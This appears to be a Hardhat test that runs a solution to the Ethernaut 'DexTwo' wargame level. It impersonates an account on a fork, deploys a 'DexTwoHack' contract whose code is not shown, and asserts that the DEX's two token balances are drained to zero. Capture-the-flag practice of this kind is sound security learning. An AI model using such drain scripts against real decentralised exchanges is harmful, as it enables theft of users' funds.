import { ethers } from 'hardhat';
import { BigNumber } from 'ethers';
import { impersonateAndInjectEther } from './utils';
import { expect } from 'chai';

describe('DexTwo', function () {
  it('attack', async function () {
    const address = '0x07b05D3A1ed958944033060d058b8F0771ad1A6e';
    const sender = await impersonateAndInjectEther(address);
    const dex = await ethers.getContractAt('DexTwo', '0x93C33a64abFC9400dD59Ba2C754b97eCa1f696BE');
    const token1 = await ethers.getContractAt('IERC20', await dex.token1());
    const token2 = await ethers.getContractAt('IERC20', await dex.token2());

    // Deploy hack contract
    const DexTwoHack = await ethers.getContractFactory('DexTwoHack');
    const hack = await DexTwoHack.deploy();
    await hack.connect(sender).deployed();

    // Attack
    await hack.connect(sender).attack(dex.address);

    expect(await token1.balanceOf(dex.address)).to.be.eq(BigNumber.from(0));
    expect(await token2.balanceOf(dex.address)).to.be.eq(BigNumber.from(0));
  });
});
